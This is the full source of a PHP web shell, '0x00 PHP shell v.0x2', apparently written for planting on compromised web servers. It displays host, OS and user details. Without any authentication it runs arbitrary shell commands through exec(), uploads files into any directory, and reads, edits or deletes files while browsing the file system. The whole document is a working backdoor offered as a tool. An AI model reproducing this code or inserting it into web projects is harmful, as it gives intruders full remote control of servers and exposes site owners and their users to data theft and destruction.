<html>
    <head>
        <title>~ 0x00 PHP shell v.0x2</title>
        <style type="text/css">
            a  {
                text-decoration: none;
                display: block;
            }

            a img  {
                border: 0;
            }

            #view tr:hover  {
                background-color: #900;
            }

            input {
                font-family: Courier New, Courier, Fixed;
                font-size: 10px;
                background-color: #900;
                color: #fff;
            }

            input:hover  {
                background-color: #000;
            }

            textarea {
                font-family: Courier New, Courier, Fixed;
                font-size: 11px;
                background-color: #900;
                color: #fff;
            }

            body  {
                font-family: Courier New, Courier, Fixed;
                font-size: 11px;
                color: #777;
            }

            table#bordered  {
                border: 1px solid #090;
                background-color: #000;
                font-family: Courier New, Courier, Fixed;
                font-size: 11px;
                color: #aaa;
            }

            form#post  {}

            #post .buttons  {
                background-color: transparent;
                font-family: Arial;
                font-size: 11px;
                color: #777;
                border: 0;
            }

            #cell  {
                border-bottom: 1px #090 dotted;
            }
        </style>
    </head>

    <body bgcolor="#000000" background="http://0x00.ath.cx/images/dot.gif" link="#444444" vlink="#444444">
    <h1 style='color: #fff'><u><a href="<?php print $_SERVER['PHP_SELF']; ?>" style="color: #fff">
    ~ 0x00 PHP shell v.0x2</a></u></h1>
        <p style="color: #fff">written by BlackLight<br><br># web: <u><a href="http://0x00.ath.cx" style="display: inline;
        color: #fff">http://0x00.ath.cx</a></u><br> # mail: <u>blacklight[at]autistici[dot]org</u></p><br>

        <table border=0 id="bordered">

<?php
function getperms($f)  {
    $mode=fileperms($f);

    $perm='';
    $perm .= ($mode & 00400) ? 'r' : '-';
    $perm .= ($mode & 00200) ? 'w' : '-';
    $perm .= ($mode & 00100) ? 'x' : '-';
    $perm .= ($mode & 00040) ? 'r' : '-';
    $perm .= ($mode & 00020) ? 'w' : '-';
    $perm .= ($mode & 00010) ? 'x' : '-';
    $perm .= ($mode & 00004) ? 'r' : '-';
    $perm .= ($mode & 00002) ? 'w' : '-';
    $perm .= ($mode & 00001) ? 'x' : '-';

    return $perm;
}

print "<tr><td>~ host </td><td><b>".$_SERVER['SERVER_NAME']."</b></td></tr>";
print "<tr><td>~ server </td><td><b>".$_SERVER['SERVER_SOFTWARE']."</b></td></tr>";
if (is_callable("php_uname"))
    print "<tr><td>~ os </td><td><b>".php_uname()."</b></td></tr>";

if (is_callable("posix_getuid") and is_callable("posix_getgid"))  {
    $uid=posix_getuid();
    $uname=posix_getpwuid($uid);
    $uname=$uname['name'];

    $gid=posix_getgid();
    $gname=posix_getgrgid($gid);
    $gname=$gname['name'];
    
    print "<tr><td>~ uid </td><td><b>$uid ($uname)</b></td></tr>";
    print "<tr><td>~ gid </td><td><b>$gid ($gname)</b></td></tr>";
}

print "</table><br><br>";

if (!isset($_POST['file']))  {
?>

<table border=0 style="font-size: 12px">

<form enctype="multipart/form-data" action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="200000000"/>
    <input type="hidden" name="do_upload" value="true">
        <tr><td>&gt; load a file</td></tr>
        <tr><td><input type="file" name="userfile"/></td></tr>
        <tr><td><input type="submit" value="> send"/></td></tr>
</form>

<tr><td height="20px"></td></tr>

<form action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
        <tr><td>$ execute a cmd</td></tr>
        <tr><td><input type="text" name="cmd"></td></tr>
        <tr><td><input type="submit" value="> execute cmd"></td></tr>
</form>
</table>

<?php
}

#
# Upload di file
#
if (@$_POST['do_upload']==="true")  {
    if ($_POST['dir']=="true")
        $dir=$_POST['dirname'];
    else
        $dir=getcwd();

    $uploadfile=$dir."/".basename($_FILES['userfile']['name']);

    if (move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile))  {
        print "File successfully loaded<br>\n";
        print "~ file name: <b>".$_FILES['userfile']['name']."</b><br>".
            "\n~ type: ".$_FILES['userfile']['type']."<br>\n".
            "~ size: ".$_FILES['userfile']['size']." bytes<br>\n";
    }

    else print "$ Error while loading ".$_FILES['userfile']['name']."<br>\n";
}

#
# Modifica o cancellazione di file
#
if (isset($_POST['dofile']))  {
    $ref=$_SERVER['HTTP_REFERER'];
    $fname=htmlentities($_POST['dofile']);
    $content=$_POST['content'];

    #
    # Modifica
    #
    if (isset($_POST['save']))  {
        if (!($fp=fopen($fname,"w")))
            die ("$ Unable to write to <b>$fname</b><br>\n");

        fputs ($fp,$content);
        fclose($fp);

        print ("File <b>$fname</b> successfully updated<br><br>\n");
    }

    #
    # Cancellazione
    #
    if (isset($_POST['remove']))  {
        unlink ($fname) or die ("$ Unable to remove <b>$fname</b><br>\n");
        print "<b>$fname</b> successfully removed<br><br>\n";
    }
}

#
# Esecuzione di un comando
#
if (isset($_POST['cmd']))  {
    $cmd=$_POST['cmd'];
    $output=array();
    exec ($cmd,$output);

    print "<br><hr height=1 width=\"100%\">\n";
    print "# cmd output: <br><br><tt>";
    print "<div style=\"border: 1px solid #090; background-color: #000; padding: 10px\">\n";

    foreach ($output as $line)
        print "$line<br>\n";
    print "</div></tt>\n";
    die('');
}

#
# Visualizzazione di file
# 
if (isset($_POST['fname']))  {
    print "# Warning: editing or removing a file is only possible if you've got the privileges to do that<br><br>";

    $fname=htmlentities($_POST['fname']);
    $file=file($fname) or print "$ Unable to open <b>$fname</b><br>\n";

    print "<form action=\"".$_SERVER['REQUEST_URI']."\" method=\"POST\">\n";
    print "<input type=\"hidden\" name=\"dofile\" value=\"".$fname."\">\n";
    print "<textarea rows=20 cols=80 name=\"content\">";

    for ($i=0; $i<count($file); $i++)
        print htmlentities($file[$i]);

    print "</textarea><br><br>\n";
    print "<input type=\"submit\" value=\"> Save file\" name=\"save\">\n";
    print "<input type=\"submit\" value=\"> Delete file\" name=\"remove\">\n";
    print "</form>n";
}

#
# Visualizzazione del contenuto di una directory
# 
if (isset($_POST['dirname']))
    $path=htmlspecialchars($_POST['dirname']);
else
    $path=getcwd();

$dp=opendir($path) or die("$ Unable to open <b>$path</b><br>\n");
chdir ($path);
$path=getcwd();

print "<div id=\"view\"><hr height=1 width=\"100%\">\n";
print "<font color=\"white\">&gt; cwd: <b>".getcwd()."</b></font><br><br>\n\n";
$dir=array();

while ($file=readdir($dp))
    if (strcmp(".",$file))
        array_push($dir,"$path/$file");

closedir($dp);
sort($dir);

?>

<form name="post" id="post" action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
<table border=0 width="100%" style="border: 1px #090 solid; background-color: #000">
<?php
for ($i=0; $i<count($dir); $i++)  {
    print "<tr style='font-family: Arial; font-size: 11px;'>\n";

    #
    # Directory superiore
    #
    if (basename($dir[$i])==="..")  {
        $tmp=explode('/',getcwd());
        $new="";

        for ($j=0; $j<count($tmp)-1; $j++)
            $new .= $tmp[$j]."/";

        print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">UP</td>\n";
        print "<td id=\"cell\"><input type=\"submit\" name=\"dirname\" value=\"".$new."\" class=\"buttons\"></td></tr>\n";
    }

    #
    # Directory
    #
    if (is_dir($dir[$i]))  {
        if (basename($dir[$i])!='..')  {
            print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">DIR</td>\n";
            print "<td id=\"cell\"><input type=\"submit\" name=\"dirname\" value=\"".$dir[$i]."\" class=\"buttons\"></td>\n";
            print "<td id=\"cell\">DIR</td></tr>\n";
        }
    }
    
    #
    # File comune
    # 
    else  {
        if (basename($dir[$i])!='..')  {
            print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">FILE</td>\n";
            print "<td id=\"cell\"><input type=\"submit\" name=\"fname\" value=\"".$dir[$i]."\" class=\"buttons\"></td>\n";
            print "<td id=\"cell\">".getperms($dir[$i])."</td></tr>\n";
        }
    }
}

print "</table></div>n";
?>
       
       </body>
</html>

